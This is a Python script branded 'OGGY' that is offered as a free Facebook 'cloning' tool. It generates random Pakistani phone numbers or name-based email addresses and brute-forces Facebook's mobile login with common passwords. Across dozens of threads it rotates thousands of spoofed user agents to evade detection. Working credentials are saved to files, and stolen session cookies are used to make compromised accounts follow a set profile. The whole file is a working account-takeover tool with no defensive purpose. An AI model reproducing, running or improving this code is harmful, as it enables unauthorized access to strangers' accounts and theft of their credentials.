#!/usr/bin/python3
import os,sys,time,json,random,re,string,platform,base64,uuid,subprocess
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#-----[Global Functions]-----#
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
#-----[Colours]-----#
RED = '\033[1;91m' #
WHITE = '\033[1;97m' #
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m' #
BLUE = '\033[1;34m' #
ORANGE = '\033[1;35m' #
P = '\x1b[1;97m' # 
M = '\x1b[1;91m' # 
H = '\x1b[1;92m' # 
K = '\x1b[1;92m' # 
B = '\x1b[1;94m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;96m' #
N = '\x1b[0m' #
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
mtd,cp_cpx,cokix=[],[],[]
ugen2=[]
ugen=[]

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
           
#-----[UserAgent]-----#
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
for agent in range(10000):
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/533.1'
	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(fullagnt)
rug=[]
for nt in range(10000):
	rr=random.randint
	aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	rx=random.randrange(1, 999)
	xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
	rug.append(xx)
ruz=[]
for mtc in range(10000):
	rr=random.randint
	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
	ruz.append(xd)
	
#new ua
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
         
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.001)
#-----[Logo]-----#
logo = f"""
     \033[1;36m#######        \033[1;0m             
     \033[1;33m#     #  ####   ####  #   # \033[1;0m
     \033[1;33m#     # #    # #    #  # #  
     \033[1;36m#     # #      #        #  \033[1;0m 
     \033[1;36m#     # #  ### #  ###   #  \033[1;0m 
     \033[1;33m#     # #    # #    #   #   
    \033[1;36m #######  ####   ####    #\033[1;0m  \033[1;32mXD\033[1;0m
\033[1;36m═══════════════════════════════════════\033[1;0m
 [\033[1;32m+\033[1;0m] \033[1;33mAUTHOR   \033[1;0m : \033[1;32mREHAN:)
 \033[1;0m[\033[1;32m+\033[1;0m] \033[1;33mTOOL NAME \033[1;0m: \033[1;32mOGGY
 \033[1;0m[\033[1;32m+\033[1;0m] \033[1;33mTOOL TYPE\033[1;0m : \033[1;32mRNDM + EMAIL CLONING
\033[1;0m [\033[1;32m+\033[1;0m] \033[1;33mSTATUS  \033[1;0m  : \033[1;32mFREE
\033[1;0m [\033[1;32m+\033[1;0m] \033[1;33mVERSION \033[1;0m  : \033[1;32m1.0\033[1;0m
\033[1;36m═══════════════════════════════════════
    \033[1;32mSome girls are still afraid of 
             cockroaches.\033[1;0m
\033[1;36m═══════════════════════════════════════\033[1;0m"""

try:
   print('\n\n\033[1;33mLOADING ASSET FILES ... \033[0;97m')
   v = 5.2
   update = ('5.2')
   update = ('5.2')
   if str(v) in update:
       os.system('clear')
   else:pass
except:print('\n\033[1;31mNO INTERNET CONNECTION ... \033[0;97m')

def linex():
        print('\033[1;36m═══════════════════════════════════════\033[1;0m')
 
def clear():
    os.system('clear')
    print(logo)
    
#-----[Loop Menu]-----#  
loop = 0
oks = []
cps = []

def menu():
	os.system('clear');print(logo)
	print(f' [\033[1;32m1\033[1;0m] \033[1;33mSTART CRACKING...\033[1;0m')
	print(' \033[1;0m[\033[1;32m2\033[1;0m] \033[1;33mCONTACT TO AUTHOR\033[1;0m')
	print(' \033[1;0m[\033[1;32m3\033[1;0m] \033[1;33mJOIN OUR WHATSAPP GROUP\033[1;0m')
	print('\033[1;0m [\033[1;32m0\033[1;0m] \033[1;33mEXIT\033[1;0m')
	linex()
	mumitf=input(' [\033[1;32m+\033[1;0m] \033[1;33mCHOOSE: ')
	if mumitf in['1','01']:mumit_menu()
	elif mumitf in ['2','02']:os.system('xdg-open https://www.facebook.com/profile.php?id=100090129800961')
	elif mumitf in['3','03']:os.system('xdg-open https://chat.whatsapp.com/FsYQM3FhHlA9IqOOU0ot6Y')
	elif mumitf in['0','00']:exit()
	else:print('\a \033[1;0m[\033[1;32m+\033[1;0m] \033[1;31mCHOOSE A VALID OPTION!');time.sleep(2);menu()

#-----[Main-Menu]-----#
def mumit_menu():
    os.system('clear');print(logo)
    print(' [\033[1;32m1\033[1;0m] \033[1;33mRANDOM NUMBER CRACK\033[1;0m')
    print(' [\033[1;32m2\033[1;0m] \033[1;33mRANDOM GMAIL CRACK\033[1;0m')
    print(' [\033[1;32m3\033[1;0m] \033[1;33mCHOOSE PASSWORD CRACK\033[1;0m')
    print(' [\033[1;32m0\033[1;0m] \033[1;33mBACK TO MAIN MENU\033[1;0m')
    linex()
    mumit=input(' [\033[1;32m+\033[1;0m] \033[1;33mCHOOSE: ')
    if mumit in['1','01']:innocent()
    elif mumit in ['2','02']:gmail()
    elif mumit in['3','03']:main()
    elif mumit in['0','00']:menu()
    else:print('\a\033[1;0m [\033[1;32m+\033[1;0m] \033[1;31mCHOOSE A VALID OPTION!');time.sleep(2);mumit_menu()
    
def main():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f' [\033[1;32m+\033[1;0m]\033[1;33m PAK CODE : 0300/0324/0342/0315')
    linex()
    code = input(f' [\033[1;32m+\033[1;0m] \033[1;33mCHOOSE : ')
    linex()
    os.system('clear')
    print(logo)
    print(' [\033[1;32m+\033[1;0m] \033[1;33mEXAMPLE : 3000/5000/10000/50000')
    linex()
    limit = int(input(' [\033[1;32m+\033[1;0m] \033[1;33mCHOOSE : '))
    linex()
    xd_cp=input(f' [\033[1;32m+\033[1;0m] \033[1;33mWANTS TO SHOW CP?\033[1;37m[\033[1;32mY\033[1;37m/\033[1;32mN\033[1;37m]:\033[1;32m')
    if xd_cp in ['y','Y','yes','Yes','1']:cp_cpx.append('y')
    else:cp_cpx.append('n')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    print(' [\033[1;32m+\033[1;0m] \033[1;33mEXAMPLE : 1,2,3,4,5')
    linex()
    passx = input(" [\033[1;32m+\033[1;0m] \033[1;33mENTER PASSWORD LIMIT : ")
    HamiiID = []
    os.system('clear')
    print(logo)
    print(f' [\033[1;32m+\033[1;0m] \033[1;33m EXAMPLE : firstlast,first last,first123,last786')
    linex()
    for bilal in range(passx):
        pww = input(f" [\033[1;32m+\033[1;0m] \033[1;33m ENTER PASSWORDS {bilal+1} : \033[1;32m")
        HamiiID.append(pww)
    with ThreadPool(max_workers=30) as manshera:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' [\033[1;32m+\033[1;0m] \033[1;33mYOUR CODE: \033[1;32m'+code)
        print(' \033[1;0m[\033[1;32m+\033[1;0m] \033[1;33mTOTAL IDZ:\033[1;32m '+str(limit))
        print('\033[1;0m [\033[1;32m+\033[1;0m] \033[1;33mPROCCESS HAS BEEN STARTED:)')
        linex()
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(mumitx,uid,pwx,tl)
    print(f'\033[1;0m[\033[1;32m+\033[1;0m] \033[1;33mCRACK PROCESS HAS BEEN COMPLETED ')
    print(f'\033[1;0m[\033[1;32m+\033[1;0m] \033[1;33mOk Ids Saved in /OGGY-OK.txt')
    print(f'\033[1;0m[\033[1;32m+\033[1;0m] \033[1;33mCp Ids Saved in /OGGY-CP.txt')
    input(f'\033[1;0m[\033[1;32m+\033[1;0m] \033[1;33mPRESS ENTER TO MAIN MENU')
 
def gmail():
    user=[]
    os.system('clear')
    print(logo)
    print(f" [\033[1;32m+\033[1;0m]\033[1;33m FIRST NAME EXAMPLE : rajpoot,baloch...etc \n \033[1;0m[\033[1;32m+\033[1;0m]\033[1;33m LAST NAME EXAMPLE : usman,zoya...etc");linex()
    kode = input(f' \033[1;0m[\033[1;32m+\033[1;0m]\033[1;33m ENTER FIRST NAME : ')
    kodex = input(f' \033[1;0m[\033[1;32m+\033[1;0m]\033[1;33m ENTER LAST NAME :  ');linex();clear()
    print(f'\033[1;0m [\033[1;32m+\033[1;0m]\033[1;33m EXAMPLE : @gmail.com, @yahoo.com ');linex()
    doamin = input(f'\033[1;0m [\033[1;32m+\033[1;0m]\033[1;33m ENTER GMAIL : ');linex()
    limit = int(input(f' \033[1;0m[\033[1;32m+\033[1;0m]\033[1;33m ENTER LIMIT : '))
    xd_cp=input(f' [\033[1;32m+\033[1;0m] \033[1;33mWANTS TO SHOW CP?\033[1;37m[\033[1;32mY\033[1;37m/\033[1;32mN\033[1;37m]:\033[1;32m')
    if xd_cp in ['y','Y','yes','Yes','1']:cp_cpx.append('y')
    else:cp_cpx.append('n')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \033[1;0m[\033[1;32m+\033[1;0m] \033[1;33mYOUR GMAIL:\033[1;32m '+doamin)
        print(' \033[1;0m[\033[1;32m+\033[1;0m] \033[1;33mTOTAL IDZ:\033[1;32m '+tl)
        print('\033[1;0m [\033[1;32m+\033[1;0m] \033[1;33mPROCCESS HAS BEEN STARTED:)')
        linex()
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(mumitx,uid,pwx,tl)
    print(f'\033[1;0m[\033[1;32m+\033[1;0m] \033[1;33mCRACK PROCESS HAS BEEN COMPLETED ')
    print(f'\033[1;0m[\033[1;32m+\033[1;0m] \033[1;33mOk Ids Saved in /OGGY-OK.txt')
    print(f'\033[1;0m[\033[1;32m+\033[1;0m] \033[1;33mCp Ids Saved in /OGGY-CP.txt')
    input(f'\033[1;0m[\033[1;32m+\033[1;0m] \033[1;33mPRESS ENTER TO MAIN MENU')
    

def innocent():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(' [\033[1;32m+\033[1;0m]\033[1;33m PAK CODE : 0300/0324/0342/0315')
    linex()
    code = input(' [\033[1;32m+\033[1;0m] \033[1;33mCHOOSE : ')
    os.system('clear')
    print(logo)
    print(' [\033[1;32m+\033[1;0m] \033[1;33mEXAMPLE : 3000/5000/10000/50000')
    linex()
    limit = int(input(' [\033[1;32m+\033[1;0m] \033[1;33mCHOOSE : '))
    linex()
    xd_cp=input(f' [\033[1;32m+\033[1;0m] \033[1;33mWANTS TO SHOW CP?\033[1;37m[\033[1;32mY\033[1;37m/\033[1;32mN\033[1;37m]:\033[1;32m')
    if xd_cp in ['y','Y','yes','Yes','1']:cp_cpx.append('y')
    else:cp_cpx.append('n')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=50) as ahare:
        clear()
        tl = str(len(user))
        print(' [\033[1;32m+\033[1;0m] \033[1;33mYOUR CODE:\033[1;32m '+code)
        print(' \033[1;0m[\033[1;32m+\033[1;0m] \033[1;33mTOTAL IDZ:\033[1;32m '+str(limit))
        print('\033[1;0m [\033[1;32m+\033[1;0m] \033[1;33mPROCCESS HAS BEEN STARTED:)')
        linex()
        for fuck in user:
            uid = code+fuck
            pwx = [fuck,'khankhan','khan khan','khan1122','khan12','khan123','khan786']
            ahare.submit(mumitx,uid,pwx,tl)
    print(f'\033[1;0m[\033[1;32m+\033[1;0m] \033[1;33mCRACK PROCESS HAS BEEN COMPLETED ')
    print(f'\033[1;0m[\033[1;32m+\033[1;0m] \033[1;33mOk Ids Saved in /OGGY-OK.txt')
    print(f'\033[1;0m[\033[1;32m+\033[1;0m] \033[1;33mCp Ids Saved in /OGGY-CP.txt')
    input(f'\033[1;0m[\033[1;32m+\033[1;0m] \033[1;33mPRESS ENTER TO MAIN MENU')
    
def mumitx(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'p.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Opera";v="97"',
            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5661.226", "Opera";v="97.0.3507.107"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"macOS"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://p.facebook.com/?rtime=1685925951&subno_key=AaFrAuPxX-oXppExQwWOWMjfjy9zFTcrVpzXiStumoD05MKhanmNbYdt64Yewt2yswNfFHTerBIyFMAKWUPbOlZugtC9nzKHgFnPy-5yvxLlrh2U_m0XMlyW3Fh60qUlMsdH-KLI77LkNORoWEfvRGTplE2yyFOtIUllFsfsAzlIjFUU4bAYZp_5ppoAEY3GC22qjFF52He5cxcetea6dzCjIZTocigW4Tkigfxs7j7ixxL8E6EMj3VNgn5T2X7M9QKopT8uZRVOJYfoMDJ1lM9e0ZyuW3epv96plYc9TniObnwnefrb94z0Y7mjWg5aOAQ&hrc=1&wtsid=rdr_00HIzeozZTVhFoZIu&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[INNOCENT-OK] ' +uid+ ' | ' +ps+ ' \033[0;97m')
                open('/sdcard/OGGY-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                if 'y' in cp_cpx: 
                 print('\r\r\033[1;30m[OGGY-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
                open('/sdcard/OGGY-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96mOGGY\033[0;97m]  [\033[0;96m%s\033[0;97m]  [\033[0;92mOK\033[0;97m/\033[0;93mCP\033[0;97m]  [\033[0;92m%s\033[0;97m/\033[0;93m%s\033[0;97m] '%(H,loop,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass

#-----[Run Menu]-
menu()